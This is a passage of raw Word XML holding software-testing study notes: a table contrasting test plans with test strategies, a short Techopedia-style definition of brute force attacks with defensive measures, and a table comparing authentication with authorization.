        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="343434"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
          <w:sz w:val="33"/>
          <w:szCs w:val="33"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="343434"/>
          <w:sz w:val="33"/>
          <w:szCs w:val="33"/>
        </w:rPr>
        <w:t>Difference between Test Strategy and Test Plan</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="text" w:horzAnchor="page" w:tblpX="1" w:tblpY="265"/>
        <w:tblW w:w="116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330"/>
        <w:gridCol w:w="7339"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="489"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4330" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:spacing w:after="250" w:line="250" w:lineRule="atLeast"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Test Plan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7339" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:spacing w:after="250" w:line="250" w:lineRule="atLeast"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Test Strategy</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="1769"/>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57"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>A test plan for software project can be defined as a document that defines the scope, objective, approach and emphasis on a software testing effort</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Pr="00132184" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="58"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test strategy is a set of guidelines that explains test design and determines how testing needs to be done</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="2270"/>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59"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Components of Test plan include- Test plan id, features to be tested, test techniques, testing tasks, features pass or fail criteria, test deliverables, responsibilities, and schedule, etc.</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60"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Components of Test strategy includes- objectives and scope, documentation formats, test processes, team reporting structure, client communication strategy, etc.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="1513"/>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61"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test plan is carried out by a testing manager or lead that describes how to test, when to test, who will test and what to test</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62"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>A test strategy is carried out by the project manager. It says what type of technique to follow and which module to test</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="768"/>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63"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Test plan narrates about the specification</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64"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test strategy narrates about the general approaches</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="523"/>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65"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test plan can change</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66"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test strategy cannot be changed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="1269"/>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67"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Test planning is done to determine possible issues and dependencies in order to identify the risks.</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68"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">It is a long-term plan of </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>action.You</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:t xml:space="preserve"> can abstract information that is not project specific and put it into test approach</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="134"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4330"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69"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>A test plan exists individually</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7339" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="70"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>In smaller project, test strategy is often found as a section of a test plan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="134"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4330"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71"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It is defined at project level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7339" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="72"/>
              </w:numPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="250" w:lineRule="atLeast"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It is set at organization level and can be used by multiple projects</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002524AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Security Testing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="002524AE" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002524AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>http://www.softwaretestinghelp.com/how-to-test-application-security-web-and-desktop-application-security-testing-techniques/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004D2166">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>http://www.softwaretestinghelp.com/security-testing-of-web-applications/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Brute Force Attack </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Definition - What does </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="it"/>
        </w:rPr>
        <w:t>Brute Force Attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> mean? </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A brute force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN). In a brute force attack, automated software is used to generate a large number of consecutive guesses as to the value of the desired data. Brute force attacks may be used by criminals to crack encrypted data, or by security analysts to test an organization's network security. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A brute force attack is also known as brute force cracking or simply brute force. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Techopedia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> explains </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="it"/>
        </w:rPr>
        <w:t>Brute Force Attack</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">One example of a type of brute force attack is known as a dictionary attack, which might try all the words in a dictionary. Other forms of brute force attack might try commonly-used passwords or combinations of letters and numbers. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An attack of this nature can be </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>time- and resource-consuming</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Hence the name "brute force attack;" success is usually based on computing power and the number of combinations tried rather than an ingenious algorithm. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The following measures can be used to defend against brute force attacks: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Requiring users to create complex passwords</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Limiting the number of times a user can unsuccessfully attempt to log in</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Temporarily locking out users who exceed the specified maximum number of failed login attempts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Difference between authentication and authorization.</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7"/>
        <w:gridCol w:w="4093"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Authentication</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Authorization</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It is the process of verifying the identity of a user.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It is the process of checking whether the user has the access rights to the system.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It always proceeds to authorization.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It is the process of allowing an authenticated user access to resources.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">It has two separate levels because all the requests coming through the IIS before it </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:t>is</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:t xml:space="preserve"> handled.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>It allows two ways to authorize the access to a given resources.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidTr="008E672E">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>They have additional schemes like windows authentication, forms authentication and passport authentication.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>The two ways are URL authorization and File authorization</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:spacing w:before="240"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="006105B7" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006105B7">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>http://www.softwaretestinghelp.com/test-summary-report-template-download-sample/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="006A7AA5" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
